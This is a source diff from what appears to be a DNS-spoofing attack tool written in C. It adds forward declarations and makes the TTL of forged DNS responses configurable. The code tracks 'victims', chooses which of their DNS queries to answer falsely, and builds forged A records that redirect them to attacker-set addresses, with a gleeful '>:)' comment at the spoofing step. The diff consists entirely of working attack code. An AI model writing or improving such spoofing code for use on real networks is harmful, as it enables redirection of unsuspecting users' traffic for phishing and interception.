@@ -18,7 +18,16 @@
 #include <time.h>
 
 static char last_name_resolved[0xff] = "";
+
 static time_t last_resolution_time = 0;
+
+static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned long src, const unsigned long dest, dnsf_ckr_realdnstransactions_ctx *transactions);
+
+static char *dnsf_ckr_qname2cstr(const unsigned char *qname);
+
+static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigned long v_addr, dnsf_ckr_realdnstransactions_ctx *transactions);
+
+static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned long src_addr, const char *hostname, dnsf_ckr_fakenameserver_ctx *fakenameserver);
 
 static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned long src, const unsigned long dest, dnsf_ckr_realdnstransactions_ctx *transactions) {
     dnsf_ckr_realdnstransactions_ctx *tp;
@@ -77,7 +86,7 @@ static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned l
     return NULL;
 }
 
-void dnsf_ckr_spoof_dns_response(dnsf_ckr_pktctx **dns, dnsf_ckr_hostnames_ctx *hostname) {
+static void dnsf_ckr_spoof_dns_response(dnsf_ckr_pktctx **dns, dnsf_ckr_hostnames_ctx *hostname, const int dnsspf_ttl) {
     if (hostname == NULL || dns == NULL) {
         return;
     }
@@ -92,13 +101,13 @@ void dnsf_ckr_spoof_dns_response(dnsf_ckr_pktctx **dns, dnsf_ckr_hostnames_ctx *
     (*dns)->rcode = 0; //  no error condition.
     (*dns)->rscrecfmt.type = DNSF_CKR_TYPE_A;
     (*dns)->rscrecfmt.clss = DNSF_CKR_CLASS_IN;
-    (*dns)->rscrecfmt.ttl = 240;
+    (*dns)->rscrecfmt.ttl = dnsspf_ttl;
     (*dns)->rscrecfmt.rdata = (unsigned char *) dnsf_ckr_getmem(sizeof(hostname->addr));
     (*dns)->rscrecfmt.rdlen = 4;
     memcpy((*dns)->rscrecfmt.rdata, &hostname->addr, sizeof(hostname->addr));
 }
 
-dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo) {
+dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo, const int dnsspf_ttl) {
     struct dnsf_ckr_ip_header *ip = NULL;
     struct dnsf_ckr_udp_header *udp = NULL;
     struct dnsf_ckr_ethernet_frame eth;
@@ -152,7 +161,7 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                         *victim = vp;
                         //  ..ok, here we go!! >:)
                         action = dnsf_ckr_action_spoof;
-                        dnsf_ckr_spoof_dns_response(&dns, hp);
+                        dnsf_ckr_spoof_dns_response(&dns, hp, dnsspf_ttl);
                         //  recalculating the checksums
                         free(udp->payload);
                         temp_port = udp->src;
